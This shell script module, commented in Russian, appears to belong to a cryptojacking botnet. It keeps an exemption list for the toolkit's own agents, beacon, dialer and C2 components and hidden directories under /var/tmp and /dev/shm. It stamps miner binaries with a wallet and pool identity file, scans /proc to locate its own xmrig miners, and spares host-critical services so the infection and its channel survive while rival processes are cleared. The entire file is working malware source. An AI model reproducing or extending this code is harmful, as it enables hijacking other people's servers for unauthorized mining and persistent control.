#!/bin/sh
# 10-exclude.sh — список исключений и отметка идентичности (.inst).
# Порт _is_excluded / _mark_miner_identity / _find_our_miners из их инсталлера,
# с нашими путями и маркерами вместо их _c1.._c6.

# свои маркеры: сюда попадает всё, что не надо трогать при зачистке
kf_exempt() {
  _x_c="$1"
  for _x_p in "${KF_MD_DIR:-}" "${KF_MD_BIN:-}" "cron-fetch" "kf-agent" "guardian.sh" \
              "svc.sh" "loop.sh" "dialer.sh" "status.sh" "beacon.sh" "w.sh" "r.sh" \
              "${KF_MARK:-kf9}" "kf-c2"; do
    [ -n "$_x_p" ] || continue
    case "$_x_c" in *"$_x_p"*) return 0 ;; esac
  done
  case "$_x_c" in
    *"${KF_ROOT:-/var/tmp/.kf}"*|*"/dev/shm/.kf"*) return 0 ;;
  esac
  return 1
}

# проверка по .inst: процесс в каталоге с нашей отметкой — свой
kf_exempt_by_inst() {
  _b_pid="$1"
  _b_exe=$(readlink "/proc/$_b_pid/exe" 2>/dev/null)
  [ -n "$_b_exe" ] || return 1
  kf_identity_ok "${_b_exe%/*}"
}

# отметка идентичности рядом с бинарём: как их .inst
kf_mark_identity() {
  _m_bin="$1"
  [ -f "$_m_bin" ] || return 0
  printf '%s %s\n' "${KF_WALLET:-}.${KF_ID:-}" "${KF_POOL:-}" > "${_m_bin%/*}/.inst" 2>/dev/null || true
}

kf_identity_ok() {
  _i_dir="$1"
  _i_f="$_i_dir/.inst"
  [ -r "$_i_f" ] || return 1
  [ "$(cat "$_i_f" 2>/dev/null)" = "${KF_WALLET:-}.${KF_ID:-} ${KF_POOL:-}" ]
}

# список наших майнеров (по имени бинаря и по exe)
kf_find_our_miners() {
  for _f_d in /proc/[0-9]*; do
    _f_pid="${_f_d##*/}"
    [ "$_f_pid" = "$$" ] && continue
    _f_comm=$(cat "$_f_d/comm" 2>/dev/null)
    _f_exe=$(readlink "$_f_d/exe" 2>/dev/null)
    _f_cmd=$(tr '\0' ' ' < "$_f_d/cmdline" 2>/dev/null)
    _f_hit=0
    if [ "$_f_comm" = "${KF_MD_BIN:-xmrig}" ]; then
      _f_hit=1
    fi
    # только настоящие майнеры: exe или первый аргумент cmdline — бинарь xmrig,
    # иначе под «свои» попадают svc.sh, loop.sh и диалер (их же и убивали)
    case "$_f_exe" in
      "${KF_ROOT:-/var/tmp/.kf}/xmrig"|"${KF_ROOT:-/var/tmp/.kf}/${KF_MD_BIN:-xmrig}"|*/xmrig|*/"${KF_MD_BIN:-xmrig}") _f_hit=1 ;;
    esac
    _f_first="${_f_cmd%% *}"
    case "$_f_first" in
      */xmrig|*/"${KF_MD_BIN:-xmrig}") _f_hit=1 ;;
    esac
    [ "$_f_hit" = "1" ] && echo "$_f_pid"
  done
}

# процессы, без которых хост или наш канал перестанут работать
kf_host_critical() {
  case "$1" in
    *node-red*|*"/node "*|"node "*|"node"|*/node|python*|redis*|postgres*|mysqld*|dockerd*|containerd*|systemd*|sshd*|cron*|entrypoint.sh*)
      return 0 ;;
  esac
  return 1
}
